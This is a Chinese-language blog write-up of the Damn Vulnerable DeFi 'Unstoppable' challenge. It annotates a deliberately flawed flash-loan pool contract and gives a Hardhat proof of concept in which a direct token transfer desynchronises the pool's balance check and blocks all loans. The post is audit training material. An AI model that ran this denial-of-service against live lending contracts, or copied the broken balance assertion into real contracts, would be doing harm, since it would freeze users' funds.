---
title: '合约审计-1'
date: 2022-12-26 14:42:15
tags:
- '区块链技术'
- '智能合约审计'
categories:
- '智能合约安全'




---

<!-- more -->

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IReceiver {
    function receiveTokens(address tokenAddress, uint256 amount) external;
}

/**
 * @title UnstoppableLender
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * 贷款池合约
 */

contract UnstoppableLender is ReentrancyGuard {
    IERC20 public immutable damnValuableToken;
    uint256 public poolBalance;

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress);
    }

    //存钱函数 只能存入DVT
    function depositTokens(uint256 amount) external nonReentrant {
        //必须大于1 token
        require(amount > 0, "Must deposit at least one token");
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }

    //闪电贷函数,限制接收合约
    function flashLoan(uint256 borrowAmount) external nonReentrant {
        //最低借1 token
        require(borrowAmount > 0, "Must borrow at least one token");
        //限制借款token数量 不能超过token的总数量
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        // 保证合约存款池变量与此合约拥有的token数量相同 ！！problem
        assert(poolBalance == balanceBefore);

        //转账到借款合约
        damnValuableToken.transfer(msg.sender, borrowAmount);

        //指定的实现了receiveTokens函数的合约接收闪电贷  ！！problem
        IReceiver(msg.sender).receiveTokens(
            address(damnValuableToken),
            borrowAmount
        );
        //在receiveTokens函数执行完成后,把钱还回贷款池
        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
}
/*
问题1:
在执行闪电贷函数的情况下 poolBalance此变量没有与合约真正存款数量同步
如果在执行闪电贷的过程中,此时合约poolBalance与合约真正拥有的token数量不一致,
那么就会直接返回false/revert

问题2:没有对实现receiveTokens函数的合约进行校验,如果是恶意合约肯定不会正常执行闪电贷流程
*/
```

##### 合法的receive合约:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title ReceiverUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * 接收闪电贷合约
 */
contract ReceiverUnstoppable {
    UnstoppableLender private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
    }

    // Pool will call this function during the flash loan
    function receiveTokens(address tokenAddress, uint256 amount) external {
        //必须是贷款池调用的此接收函数,才能继续闪电贷
        require(msg.sender == address(pool), "Sender must be pool");
        // 函数最后语句就是将钱还回贷款池
        require(
            IERC20(tokenAddress).transfer(msg.sender, amount),
            "Transfer of tokens failed"
        );
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(amount);
    }
}

```

##### 测试环境运行验证poc:

```js
const { ethers } = require('hardhat')
const { expect } = require('chai')
/*
  在以下条件下运行 Unstoppable 文件夹内的合约
*/
describe('test-run-Unstoppable', function () {
  let deployer, attacker, someUser

  // Pool has 1M * 10**18 tokens
  const TOKENS_IN_POOL = ethers.utils.parseEther('1000000')
  const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100')

  before(async function () {
    ;[deployer, attacker, someUser] = await ethers.getSigners()
    //deployer拥有type(uint256).max的DVT代币,并且拥有一个贷款池
    const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer)
    const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer)

    this.token = await DamnValuableTokenFactory.deploy()
    this.pool = await UnstoppableLenderFactory.deploy(this.token.address)
    //允许贷款池使用代币1000000 并存入到贷款池合约
    await this.token.approve(this.pool.address, TOKENS_IN_POOL)
    await this.pool.depositTokens(TOKENS_IN_POOL)

    //初始攻击EOA有100个token
    await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE)

    expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL)

    expect(await this.token.balanceOf(attacker.address)).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE)

    // 正常闪电贷过程
    const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser)
    this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address)
    await this.receiverContract.executeFlashLoan(10)
  })

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    /*
    只需要不参与贷款池的depositTokens流程,而是直接转账进入贷款池合约
    就会导致贷款池合约poolBalance变量与真正的合约余额不同步
    */
    await this.token.connect(attacker).transfer(this.pool.address, 1)
  })

  after(async function () {
    /** SUCCESS CONDITIONS */

    // It is no longer possible to execute flash loans
    await expect(this.receiverContract.executeFlashLoan(10)).to.be.reverted
  })
})

```

